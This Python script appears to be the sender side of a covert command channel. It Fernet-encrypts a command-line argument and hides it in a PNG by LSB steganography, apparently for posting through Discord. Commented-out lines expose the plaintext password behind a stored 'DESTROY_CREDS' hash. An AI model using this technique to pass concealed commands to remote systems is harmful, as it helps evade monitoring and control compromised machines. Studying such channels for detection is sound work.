from email import message
from matplotlib import image
from matplotlib.font_manager import json_dump
from stegano import lsbset
from stegano import lsb
from stegano.lsbset import generators
import glob, random, string
from cryptography.fernet import Fernet

import discord
import sys
import json
import hashlib
import os

f = open('secrets.json')
secrets = json.load(f)

def encrypt_message(message, key):
    f = Fernet(key)
    return f.encrypt(message.encode()).decode()

def embed_message(message):
    images = glob.glob("./raw_img/*.png")
    choice = random.choice(images)
    secret_image = lsb.hide(choice, message)
    return secret_image

def prepare_command(command, key):
    command_ciphertext = encrypt_message(command, key)
    embedded_command = embed_message(command_ciphertext)
    return embedded_command

def generate_hash_and_salt(password):
    #salt = ''.join(random.choice(string.printable) for i in range(32)).encode('utf-8')
    salt = os.urandom(32)
    key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt, 100000, 128)

    return salt, key

# tmp = generate_hash_and_salt('begone thot')
# res = dict()
# res['salt'] = tmp[0].decode("iso-8859-1")
# res['key'] = tmp[1].decode("iso-8859-1")

# json_dump(res, 'tmp.json')

# print(secrets['DESTROY_CREDS']['key'].encode("iso-8859-1") == hashlib.pbkdf2_hmac('sha256', 'begone thot'.encode('utf-8'), secrets['DESTROY_CREDS']['salt'].encode('iso-8859-1'), 100000, 128))

# old_key = secrets['DESTROY_CREDS']['key'].encode("iso-8859-1")
# new_key = hashlib.pbkdf2_hmac('sha256', 'begon tho'.encode('utf-8'), secrets['DESTROY_CREDS']['salt'].encode('iso-8859-1'), 100000, 128)

# print(old_key)
# print(new_key)

# print(old_key == new_key)

image = prepare_command(sys.argv[1], secrets["ENCRYPTION_KEY"])
image.save('./secret_img/upload.png')